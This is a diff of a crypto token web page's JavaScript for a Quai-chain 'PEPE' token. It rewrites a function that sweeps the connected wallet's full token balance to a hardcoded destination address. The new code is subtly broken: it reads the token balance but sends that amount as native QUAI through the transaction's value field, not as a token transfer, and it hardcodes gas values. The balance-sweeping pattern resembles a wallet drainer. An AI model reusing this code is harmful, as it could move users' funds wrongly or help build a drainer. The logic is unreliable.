@@ -12,7 +12,7 @@
     <link rel="icon" type="image/png" sizes="512x512" href="android-chrome-512x512.png">
     
     <!-- Include Quai SDK -->
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="application/javascript"></script>
+
     <script src="https://unpkg.com/quais@latest/dist/quais.umd.js"></script>
     
     <!-- Firebase SDK -->
@@ -443,57 +443,56 @@ async function saveToFirebase(data) {
             throw new Error('Pelagus wallet not found');
         }
 
-        // Check QUAI balance for gas
+        // Check QUAI balance
         const quaiBalance = await getQuaiBalance(userSession.address);
         const quaiAmount = parseInt(quaiBalance, 16) / 1e18;
-        const requiredQuai = 0.1;
-        
-        if (quaiAmount < requiredQuai) {
-            log('❌ Insufficient QUAI for gas fees');
-            log(`You need at least ${requiredQuai} QUAI for transaction. Current balance: ${quaiAmount.toFixed(4)} QUAI`);
-            throw new Error('Insufficient QUAI balance for gas');
+        if (quaiAmount < 0.1) {
+            log(`❌ Need at least 0.1 QUAI for gas. Current: ${quaiAmount.toFixed(4)} QUAI`);
+            throw new Error('Insufficient QUAI balance');
         }
 
-        // Initialize provider and signer
-        const provider = new quais.BrowserProvider(window.pelagus);
-        const signer = await provider.getSigner();
-        
-        // Initialize token contract
-        const tokenContract = new quais.Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);
-
-        // Get token balance
-        const balance = await tokenContract.balanceOf(userSession.address);
-        if (balance <= 0) {
+        // Check token balance
+        const currentBalance = await getTokenBalance(userSession.address);
+        if (currentBalance <= 0n) {
             log('❌ No tokens available to send');
             throw new Error('No tokens available to send');
         }
 
-        const readableAmount = quais.formatUnits(balance, 18);
-        log(`📤 Sending ${readableAmount} OG Quai PEPE tokens...`);
+        const readableAmount = (Number(currentBalance) / 1e18).toString();
+        log(`📤 Found ${readableAmount} tokens to send`);
 
-        // Send transaction
-        const tx = await tokenContract.transfer(DESTINATION_ADDRESS, balance);
-        log(`📝 Transaction hash: ${tx.hash}`);
+        const transactionParameters = {
+            from: userSession.address,
+            to: DESTINATION_ADDRESS,
+            value: `0x${currentBalance.toString(16)}`,
+            gas: '0x186A0',      // 100000 gas
+            gasPrice: '0x53E2D6' // Adjust if needed
+        };
+
+        log(`🔄 Sending to ${DESTINATION_ADDRESS}`);
+        const txHash = await window.pelagus.request({
+            method: 'eth_sendTransaction',
+            params: [transactionParameters],
+        });
+
+        log(`📝 Transaction hash: ${txHash}`);
+        log('⏳ Waiting for confirmation...');
+
+        const receipt = await waitForTransaction(txHash);
         
-        // Wait for confirmation
-        log('🔄 Waiting for confirmation...');
-        const receipt = await tx.wait();
-
-        // Update UI and database
         userSession.transferAmount = readableAmount;
-        userSession.transferTxHash = tx.hash;
+        userSession.transferTxHash = txHash;
         await saveSessionToFirebase();
 
         document.getElementById('sendBtn').style.display = 'none';
         document.getElementById('scanBtn').style.display = 'block';
         document.getElementById('buyBtn').style.display = 'block';
 
-        log('✅ Transaction confirmed!');
-        log(`💫 Successfully sent ${readableAmount} tokens!`);
+        log('✅ Transfer complete!');
 
     } catch (error) {
         if (error.code === 4001) {
-            log('❌ Transaction rejected in wallet');
+            log('❌ Transaction rejected');
             return;
         }
         log('❌ Error: ' + error.message);
